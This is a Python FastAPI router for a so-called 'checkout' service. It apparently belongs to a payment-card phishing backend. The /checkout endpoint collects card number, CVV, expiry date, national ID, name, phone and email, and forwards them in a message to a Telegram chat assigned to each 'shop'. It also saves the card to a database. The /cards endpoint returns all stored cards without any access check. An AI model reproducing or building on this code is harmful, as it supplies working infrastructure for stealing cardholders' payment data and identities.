from fastapi import APIRouter, Depends, Request
from ..utils.custom_responses import make_response, abort
from sqlalchemy.orm import Session
from ..config.database_config import get_db
from sqlalchemy.exc import SQLAlchemyError
from ..models.models import Card, User
from ..schemas.card import CardCreateDTO
from ..schemas.telegram import TelegramSchema
from ..services.telegram import Telegram
from ..models.models import Shop

router = APIRouter()

@router.get("/cards")
async def get_cards(db: Session = Depends(get_db)):
    try:
        response = db.query(Card).all()
        json_response = []
        for card in response: json_response.append(card.to_json())
        return make_response(json_response, 200)
    except SQLAlchemyError as e:
        return make_response(str(e), 400, "/cards GET")

@router.get("/cards/{card_id}")
async def get_card(card_id:int, db: Session = Depends(get_db)):
    if not card_id: abort(400, "Card ID is required")
    try:
        card_q = db.query(Card).filter(Card.id == card_id).first()
        if not card_q: raise abort(404, f"Card with ID {card_id} not found")  
        return make_response(card_q.to_json(), 200)
    except SQLAlchemyError as e:
        return make_response(str(e), 400,"/cards/{card_id} GET" )
    
@router.post("/checkout")
async def checkout(body: TelegramSchema, request:Request, db:Session = Depends(get_db)):
    shop_id = request.headers.get("Shop-Id")
    shop_q = db.query(Shop).filter(Shop.id == shop_id).first()
    if not shop_q: abort(400, "Invalid Shop")
    
    try:
        telegramDTO = {
            "chat_id": shop_q.telegram_id,
            "DNI": body.DNI,
            "number": body.number,
            "CVV": body.CVV,
            "Vto": body.Vto,
            "full_name": body.full_name,
            "phone": body.phone,
            "email": body.email
        }
        telegram_instance = Telegram(payload=telegramDTO)
        message = telegram_instance.build_message()
        telegram_instance.send_message(message)

        card_instance = Card(body)
        db.add(card_instance)
        db.commit()
        db.refresh(card_instance)
        
        return make_response("Mensaje enviado exitosamente!", 200)
    except SQLAlchemyError as e:
        return make_response(str(e), 400, "checkout")
    except Exception as e:
        return make_response(str(e), 500, "checkout")
    
    

